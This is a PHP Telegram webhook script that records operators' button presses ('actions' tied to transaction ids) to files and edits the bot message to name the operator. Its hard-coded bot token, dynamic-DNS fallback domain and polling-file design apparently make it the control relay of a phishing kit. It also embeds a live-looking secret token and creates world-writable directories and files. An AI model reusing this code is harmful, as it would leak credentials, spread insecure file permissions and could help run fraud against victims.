<?php
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

$configPath = __DIR__ . '/config.php';
$config = file_exists($configPath) ? include $configPath : [];

$botToken = $config['bot_token'] ?? '8714922704:AAG9dcP56xY_gdUktBusuZFMdlj5Aqo2p4k';
$chatId   = $config['chat_id']   ?? '-5234970591';

// GET request with ?set=1 to easily register webhook
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['set'])) {
    $domain = 'https://' . ($_SERVER['HTTP_HOST'] ?? 'jetscolombia.duckdns.org');
    $webhookUrl = $domain . '/webhook.php';
    $res = file_get_contents("https://api.telegram.org/bot{$botToken}/setWebhook?url=" . urlencode($webhookUrl));
    echo $res;
    exit;
}

// GET request with ?info=1 to check webhook info
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['info'])) {
    $res = file_get_contents("https://api.telegram.org/bot{$botToken}/getWebhookInfo");
    echo $res;
    exit;
}

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update || !isset($update['callback_query'])) {
    echo json_encode(['ok' => true]);
    exit;
}

$cb = $update['callback_query'];
$cbData = $cb['data'] ?? '';
$actionType = '';
$transactionId = '';

if (strpos($cbData, ':') !== false) {
    list($actionType, $transactionId) = explode(':', $cbData, 2);
} elseif (strpos($cbData, '|') !== false) {
    list($actionType, $transactionId) = explode('|', $cbData, 2);
} else {
    $actionType = $cbData;
}

if ($actionType !== '' && $transactionId !== '') {
    $safeTxId = preg_replace('/[^a-zA-Z0-9_-]/', '', $transactionId);
    
    // Directorio limpio y exclusivo para Back4App
    $centralDir = __DIR__ . '/actions';
    if (!is_dir($centralDir)) {
        @mkdir($centralDir, 0777, true);
        @chmod($centralDir, 0777);
    }

    $usedDir = $centralDir . '/used';
    if (!is_dir($usedDir)) {
        @mkdir($usedDir, 0777, true);
        @chmod($usedDir, 0777);
    }

    $usedFile = $usedDir . '/' . $safeTxId . '.txt';
    if (file_exists($usedFile)) {
        @unlink($usedFile);
    }

    $actionFile = $centralDir . '/' . $safeTxId . '.txt';
    $stamp = time() . '_' . bin2hex(random_bytes(3));
    file_put_contents($actionFile, $actionType . '|' . $stamp, LOCK_EX);
    @chmod($actionFile, 0666);
}

// Answer callback query
$answerPayload = [
    'callback_query_id' => $cb['id'],
    'text' => '✅ Acción recibida: ' . $actionType
];
$ch = curl_init("https://api.telegram.org/bot{$botToken}/answerCallbackQuery");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($answerPayload),
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_TIMEOUT => 3
]);
curl_exec($ch);
curl_close($ch);

// Edit message in telegram
$from = $cb['from'] ?? [];
$operador = !empty($from['username']) ? '@' . $from['username'] : trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
if ($operador === '') $operador = 'Operador';

$message = $cb['message'] ?? [];
$msgChatId = $message['chat']['id'] ?? $chatId;
$msgId = $message['message_id'] ?? null;
$originalText = $message['text'] ?? ($message['caption'] ?? '');

if ($msgChatId && $msgId && $originalText) {
    $newText = $originalText . "\n\n✅ Acción: <b>" . ucfirst(str_replace('_', ' ', $actionType)) . "</b>\n👤 Por: " . $operador;
    $editPayload = [
        'chat_id' => $msgChatId,
        'message_id' => $msgId,
        'text' => $newText,
        'parse_mode' => 'HTML'
    ];
    $chEdit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
    curl_setopt_array($chEdit, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($editPayload),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 3
    ]);
    curl_exec($chEdit);
    curl_close($chEdit);
}

echo json_encode(['ok' => true]);